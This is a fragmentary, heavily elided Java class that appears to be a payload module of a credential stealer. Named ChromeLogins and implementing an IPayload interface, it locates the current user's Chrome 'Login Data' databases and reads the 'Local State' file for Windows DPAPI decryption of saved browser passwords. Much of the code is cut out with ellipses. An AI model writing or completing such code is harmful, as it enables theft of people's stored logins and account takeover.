...
public class ChromeLogins implements IPayload
{
    ...
    public static ArrayList<String> getChromeInfo() {
        ...
        try {
            ...
            for (final File file : FileUtil.getFiles("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Google\\Chrome\\User Data")) {
                if (file.getName().contains("Login Data")) {
                    ...
                    while (rs != null && rs.next()) {
                        ...
                        else if (url.length() > 40 && ChromeLogins.shorten) {
        ...
        try {
            ...
            if (WinDPAPI.isPlatformSupported()) {
                ...
                if (!isV10) {
                    ...
                    if (StringUtils.isEmpty((CharSequence)ChromeLogins.localStateFileFullPathAndName)) {
                        throw new IllegalArgumentException("Local State is required");
                    }
                    final String localState = FileUtils.readFileToString(new File(ChromeLogins.localStateFileFullPathAndName));
    ...
    static {
        localStateFileFullPathAndName = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
        ChromeLogins.shorten = true;
        ChromeLogins.obfus = false;
    }
}
